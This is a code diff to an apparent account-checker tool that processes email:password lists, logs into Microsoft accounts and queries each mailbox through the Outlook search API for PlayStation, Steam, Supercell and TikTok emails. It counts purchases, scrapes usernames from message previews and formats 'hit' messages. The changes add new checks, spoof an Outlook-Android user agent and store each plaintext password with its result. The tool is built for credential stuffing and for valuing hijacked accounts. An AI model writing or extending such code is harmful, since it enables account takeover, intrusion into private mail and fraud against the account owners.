@@ -362,18 +362,22 @@ async function checkAccount(
       } catch {}
     }
     
-    // Check PSN via email search
+    // Check PSN via email search (following Python logic exactly)
     if (checkMode === "psn" || checkMode === "all") {
       try {
         const psnPayload = {
           "Cvid": crypto.randomUUID(),
           "Scenario": {"Name": "owa.react"},
+          "TimeZone": "UTC",
+          "TextDecorations": "Off",
           "EntityRequests": [{
             "EntityType": "Conversation",
             "ContentSources": ["Exchange"],
             "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
-            "Query": {"QueryString": "sony@txn-email.playstation.com"},
-            "Size": 20
+            "From": 0,
+            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
+            "Size": 50,
+            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
           }]
         };
         
@@ -382,7 +386,9 @@ async function checkAccount(
           headers: {
             "Authorization": `Bearer ${accessToken}`,
             "X-AnchorMailbox": `CID:${cid}`,
-            "Content-Type": "application/json"
+            "Content-Type": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json"
           },
           body: JSON.stringify(psnPayload)
         });
@@ -391,6 +397,155 @@ async function checkAccount(
           const psnData = await psnRes.json();
           const orders = psnData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
           result.psn = { status: orders > 0 ? "HAS_ORDERS" : "FREE", orders, purchases: [] };
+        }
+      } catch {}
+    }
+    
+    // Check Steam via email search (following Python logic)
+    if (checkMode === "steam" || checkMode === "all") {
+      try {
+        const steamPayload = {
+          "Cvid": crypto.randomUUID(),
+          "Scenario": {"Name": "owa.react"},
+          "TimeZone": "UTC",
+          "TextDecorations": "Off",
+          "EntityRequests": [{
+            "EntityType": "Conversation",
+            "ContentSources": ["Exchange"],
+            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
+            "From": 0,
+            "Query": {"QueryString": "noreply@steampowered.com purchase"},
+            "Size": 30,
+            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+          }]
+        };
+        
+        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
+          method: "POST",
+          headers: {
+            "Authorization": `Bearer ${accessToken}`,
+            "X-AnchorMailbox": `CID:${cid}`,
+            "Content-Type": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(steamPayload)
+        });
+        
+        if (steamRes.ok) {
+          const steamData = await steamRes.json();
+          const count = steamData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
+          result.steam = { status: count > 0 ? "HAS_PURCHASES" : "FREE", count };
+        }
+      } catch {}
+    }
+    
+    // Check Supercell via email search (following Python logic)
+    if (checkMode === "supercell" || checkMode === "all") {
+      try {
+        const scPayload = {
+          "Cvid": crypto.randomUUID(),
+          "Scenario": {"Name": "owa.react"},
+          "TimeZone": "UTC",
+          "TextDecorations": "Off",
+          "EntityRequests": [{
+            "EntityType": "Conversation",
+            "ContentSources": ["Exchange"],
+            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
+            "From": 0,
+            "Query": {"QueryString": "noreply@id.supercell.com"},
+            "Size": 20,
+            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+          }]
+        };
+        
+        const scRes = await fetch("https://outlook.live.com/search/api/v2/query", {
+          method: "POST",
+          headers: {
+            "Authorization": `Bearer ${accessToken}`,
+            "X-AnchorMailbox": `CID:${cid}`,
+            "Content-Type": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(scPayload)
+        });
+        
+        if (scRes.ok) {
+          const scData = await scRes.json();
+          const total = scData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
+          const games: string[] = [];
+          
+          if (total > 0) {
+            const results = scData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
+            for (const r of results) {
+              const preview = r.Preview || '';
+              if (preview.includes('Clash Royale') && !games.includes('Clash Royale')) games.push('Clash Royale');
+              if (preview.includes('Clash of Clans') && !games.includes('Clash of Clans')) games.push('Clash of Clans');
+              if (preview.includes('Brawl Stars') && !games.includes('Brawl Stars')) games.push('Brawl Stars');
+              if (preview.includes('Hay Day') && !games.includes('Hay Day')) games.push('Hay Day');
+            }
+          }
+          
+          result.supercell = { status: games.length > 0 ? "LINKED" : "FREE", games };
+        }
+      } catch {}
+    }
+    
+    // Check TikTok via email search (following Python logic)
+    if (checkMode === "tiktok" || checkMode === "all") {
+      try {
+        const ttPayload = {
+          "Cvid": crypto.randomUUID(),
+          "Scenario": {"Name": "owa.react"},
+          "TimeZone": "UTC",
+          "TextDecorations": "Off",
+          "EntityRequests": [{
+            "EntityType": "Conversation",
+            "ContentSources": ["Exchange"],
+            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
+            "From": 0,
+            "Query": {"QueryString": "account.tiktok"},
+            "Size": 10,
+            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
+          }]
+        };
+        
+        const ttRes = await fetch("https://outlook.live.com/search/api/v2/query", {
+          method: "POST",
+          headers: {
+            "Authorization": `Bearer ${accessToken}`,
+            "X-AnchorMailbox": `CID:${cid}`,
+            "Content-Type": "application/json",
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(ttPayload)
+        });
+        
+        if (ttRes.ok) {
+          const ttData = await ttRes.json();
+          const total = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Total || 0;
+          let username: string | undefined;
+          
+          if (total > 0) {
+            const results = ttData.EntitySets?.[0]?.ResultSets?.[0]?.Results || [];
+            for (const r of results) {
+              const preview = r.Preview || '';
+              // Try to extract username from greeting patterns
+              const patterns = [/Salut\s+([^,]+)/, /Hallo\s+([^,]+)/, /Hi\s+([^,]+)/, /Hello\s+([^,]+)/];
+              for (const pattern of patterns) {
+                const match = preview.match(pattern);
+                if (match) {
+                  username = match[1].trim();
+                  break;
+                }
+              }
+              if (username) break;
+            }
+          }
+          
+          result.tiktok = { status: total > 0 ? "LINKED" : "FREE", username };
         }
       } catch {}
     }
@@ -406,7 +561,7 @@ async function checkAccount(
   }
 }
 
-// Build detailed message for hit
+// Build detailed message for hit (following Python output format)
 function buildHitMessage(result: CheckResult): string {
   if (result.status !== 'valid') {
     if (result.status === '2fa') return '🔐 2FA Required';
@@ -417,16 +572,35 @@ function buildHitMessage(result: CheckResult): string {
   
   const parts: string[] = ['✓ Valid'];
   
+  // Microsoft subscriptions
   if (result.msStatus === 'PREMIUM' && result.subscriptions?.length) {
     for (const sub of result.subscriptions.slice(0, 2)) {
-      parts.push(`🎮${sub.name}`);
+      const days = sub.daysRemaining ? `(${sub.daysRemaining}d)` : '';
+      parts.push(`🎮${sub.name}${days}`);
     }
   }
   
+  // PlayStation
   if (result.psn?.status === 'HAS_ORDERS') {
     parts.push(`🎯PSN:${result.psn.orders}`);
   }
   
+  // Steam
+  if (result.steam?.status === 'HAS_PURCHASES') {
+    parts.push(`🎮Steam:${result.steam.count}`);
+  }
+  
+  // Supercell
+  if (result.supercell?.status === 'LINKED') {
+    parts.push(`🎲SC:${result.supercell.games.join(',') || 'Yes'}`);
+  }
+  
+  // TikTok
+  if (result.tiktok?.status === 'LINKED') {
+    parts.push(`📱TikTok:${result.tiktok.username || 'Yes'}`);
+  }
+  
+  // Minecraft
   if (result.minecraft?.status === 'OWNED') {
     parts.push(`⛏️MC:${result.minecraft.username || 'Yes'}`);
   }
@@ -472,6 +646,7 @@ async function processAccountsBackground(
       index: i + 1,
       total,
       email: email || account,
+      password: password || '',
       status: 'checking',
       message: '⟳ Checking...',
       timestamp: Date.now()
@@ -482,6 +657,7 @@ async function processAccountsBackground(
         index: i + 1,
         total,
         email: account,
+        password: '',
         status: 'failed',
         message: '✗ Invalid format',
         timestamp: Date.now()
@@ -510,6 +686,7 @@ async function processAccountsBackground(
         index: i + 1,
         total,
         email,
+        password: password.trim(),
         status: result.status as any,
         message: buildHitMessage(result),
         timestamp: Date.now()
@@ -526,6 +703,7 @@ async function processAccountsBackground(
         index: i + 1,
         total,
         email,
+        password: password || '',
         status: 'error',
         message: `! Error: ${String(e).substring(0, 50)}`,
         timestamp: Date.now()
@@ -545,6 +723,7 @@ async function processAccountsBackground(
     index: total,
     total,
     email: 'COMPLETE',
+    password: '',
     status: 'success',
     message: `✅ Done! ${stats.valid} valid, ${stats.invalid} invalid, ${stats.twoFa} 2FA in ${duration}`,
     timestamp: Date.now()
